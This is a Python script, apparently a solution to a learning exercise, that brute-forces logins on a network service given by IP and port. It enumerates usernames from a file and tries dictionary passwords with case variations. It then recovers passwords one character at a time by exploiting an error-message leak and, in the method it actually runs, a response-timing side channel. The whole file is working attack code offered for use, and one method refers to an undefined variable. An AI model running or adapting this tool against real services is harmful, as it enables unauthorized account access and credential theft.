import socket
import sys
import string
import json
import time


class PasswordHacker:

    def __init__(self):
        self.socket = socket.socket()
        self.limit = 1000000
        self.symbols = string.ascii_lowercase + string.digits
        self.symbols_count = len(self.symbols)

    def base(self, number):
        if number < self.symbols_count:
            return self.symbols[number]
        return self.base(number // self.symbols_count - 1) + self.symbols[number % self.symbols_count]

    def send(self, ip, port, text):
        self.socket.connect((ip, int(port)))
        self.socket.send(text.encode())
        response = self.socket.recv(1024)
        self.socket.close()
        print(response.decode())

    def brut_force(self, ip, port):
        self.socket.connect((ip, int(port)))
        for i in range(0, self.limit):
            password = self.base(i)
            self.socket.send(password.encode())
            response = self.socket.recv(1024).decode()
            if response == 'Connection success!':
                print(password)
                self.socket.close()
                return True
            elif response == 'Wrong password!':
                continue
            else:
                print(i, response)
                self.socket.close()
                return False
        print(self.limit, 'Not found')
        self.socket.close()
        return False

    def brut_force_2(self, ip, port):
        self.socket.connect((ip, int(port)))
        for word in self.get_word():
            options = self.get_options(word.strip())
            for password in options:
                self.socket.send(password.encode())
                response = self.socket.recv(1024).decode()
                if response == 'Connection success!':
                    print(password)
                    self.socket.close()
                    return True
                elif response == 'Wrong password!':
                    continue
                else:
                    print(i, response)
                    self.socket.close()
                    return False
        print(self.limit, 'Not found')
        self.socket.close()
        return False

    def brut_force_3(self, ip, port):
        self.socket.connect((ip, int(port)))

        # Ищем верный логин
        for login in self.get_login():
            data = {'login': login, 'password': ''}
            self.socket.send(json.dumps(data).encode())
            response = self.socket.recv(1024).decode()
            result = json.loads(response)['result']
            if result != 'Wrong login!':
                password = []
                go = True
                while go:
                    for letter in string.digits + string.ascii_letters:
                        data = {'login': login, 'password': ''.join(password + [letter])}
                        self.socket.send(json.dumps(data).encode())
                        response = self.socket.recv(1024).decode()
                        result = json.loads(response)['result']
                        if result == 'Connection success!':
                            self.socket.close()
                            return json.dumps(data)
                        if result == 'Exception happened during login':
                            password.append(letter)
        self.socket.close()
        return False

    def brut_force_4(self, ip, port):
        self.socket.connect((ip, int(port)))

        # Ищем верный логин
        for login in self.get_login():
            data = {'login': login, 'password': ''}
            self.socket.send(json.dumps(data).encode())
            response = self.socket.recv(1024).decode()
            result = json.loads(response)['result']
            if result != 'Wrong login!':
                password = []
                go = True
                while go:
                    for letter in string.digits + string.ascii_letters:
                        data = {'login': login, 'password': ''.join(password + [letter])}
                        start = time.time()
                        self.socket.send(json.dumps(data).encode())
                        response = self.socket.recv(1024).decode()
                        end = time.time()
                        result = json.loads(response)['result']
                        if result == 'Connection success!':
                            self.socket.close()
                            return json.dumps(data)
                        if end - start > 0.05:
                            password.append(letter)
        self.socket.close()
        return False

    def get_login(self):
        with open('logins.txt', 'rt') as file:
            line = True
            while line:
                line = file.readline()
                yield line.strip()

    def get_word(self):
        with open('passwords.txt', 'rt') as file:
            line = True
            while line:
                line = file.readline()
                yield line

    def get_options(self, word, number=0):
        if number >= len(word):
            return [word]
        if word[number] in string.digits:
            return self.get_options(word, number + 1)
        letters = list(word)
        letters[number] = letters[number].lower()
        low = ''.join(letters)
        letters[number] = letters[number].upper()
        big = ''.join(letters)
        return self.get_options(low, number + 1) + self.get_options(big, number + 1)

argvlen = len(sys.argv)
ip = sys.argv[1] if argvlen > 1 else ''
port = int(sys.argv[2]) if argvlen > 1 else 0

p = PasswordHacker()
data = p.brut_force_4(ip, port)
print(data)
